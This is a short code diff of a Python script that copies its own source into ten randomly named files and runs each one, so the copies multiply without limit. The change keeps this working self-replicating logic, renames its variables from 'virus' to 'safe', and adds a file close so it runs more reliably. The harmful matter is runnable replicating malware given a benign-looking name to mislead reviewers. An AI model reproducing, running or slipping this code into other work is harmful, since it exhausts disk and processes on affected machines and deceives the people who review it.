@@ -7,11 +7,12 @@ def make_name():
     for i in range(0,20):
         name += random.choice(string.ascii_letters)
     return name
-with open(sys.argv[0], 'r') as virus_line:
-    virus = virus_line.readlines()
+with open(sys.argv[0], 'r') as safe_line:
+    safe = safe_line.readlines()
 for i in range(0,10):
-    virus_name = make_name() + '.py'
-    virus_file = open(virus_name, 'w+')
-    for line in virus:
-        virus_file.write(line)
-    os.system(f'python3 {virus_name}')
+    safe_name = make_name() + '.py'
+    safe_file = open(safe_name, 'w+')
+    for line in safe:
+        safe_file.write(line)
+    safe_file.close()
+    os.system(f'python3 {safe_name}')
